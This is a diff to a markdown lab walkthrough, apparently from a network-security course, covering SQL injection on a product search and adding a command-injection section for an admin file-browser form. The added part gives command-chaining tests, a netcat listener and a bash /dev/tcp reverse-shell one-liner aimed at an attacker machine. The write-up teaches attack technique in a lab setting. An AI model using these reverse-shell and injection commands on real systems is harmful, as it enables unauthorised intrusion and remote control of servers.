@@ -14,7 +14,7 @@ In this scenario, it is possible to search among the products in the database us
 * http://193.20.1.2:5000/search?nome=mela
 
 From the URL above, you can see that the results comes from the "nome" parameter in the query string. The web application needs to retreive the article from the database and may use an SQL statement that looks something like the following:
-* **[...] SELECT all FROM table WHERE nome=mela [...]**
+* **SELECT all FROM table WHERE nome=mela**
 
 You can assume that this query is to search for stored products of a table. Is there a way to explore the other tables?
 
@@ -51,6 +51,33 @@ It turns out that there is a database called "networkSecurity" with a table call
 
 **Command Injection** is an attacck in wich the goal is execution of arbitrary commands on the host operating system via a vulnerable application. These attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system command are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.
 
+Having logged in with the admin credentials, you are redirected to the /admin page. You may notice a form that says "*Explore your File System*", using this feature the admin can navigate through the folders containing the source codes for the web application. It is possible to assume that the web application uses a function to launch commands that will be executed by the shell.
+The command being executed probably looks something like this:
+* **"ls -l " + input**
+
+The current goal is to find a way to execute malicious commands by taking advantage of possible poor input validation, to do this we can use the pipe command.
+
+### Pipe Command
+A pipe is an aspect of redirection i.e., transfer of any standard output to another target path which is commonly used in Unix and Linux-like operating systems in order to send the outputs of one process/command/program to another/program/command/process for any further processing. The Linux/Unix system enables stdout of a command to connect to stdin of other commands, which we can do by the pipe character ‘|.’
+
+### && Operator in Linux
+
+The Bash logical (&&) operator is one of the most useful commands that can be used in multiple ways, like you can use in the conditional statement or execute multiple commands simultaneously. Generally speaking, the logical operator is the one that is used to connect more than one expression and then provides the output based on their combined result.
+
+These are just some of the possible ways to chain multiple commands, you can do an initial test with the *whoami* command:
+* **ls -l | whoami**
+
+### Reverse Shell
+It is possible to have the server open a terminal to our attacking machine. To do this, you can open a shell to a remote address with a simple terminal command:
+* **bash -i >& /dev/tcp/IP_ADDRESS/PORT**
+
+You need to listen on the attacking machine in order to accept the server connection. We use the netcat tool to do this:
+* **nc -lnvp PORT** (you can choose any free port)
+
+Thanks to command injection, we can open a remote shell on our attacking machine by typing the command:
+* **bash -c "bash -i >& /dev/tcp/193.20.1.4/PORT 0>&1"**
+
+In this case, the server does not use the **/bin/bash** shell by default, so you need to invoke it with the -c flag to specify which command it should execute. If everything went well, the server will get stuck loading the page, and a remote shell will open on your terminal.
 ## Privilege Escalation
 
 ## Cracking Password
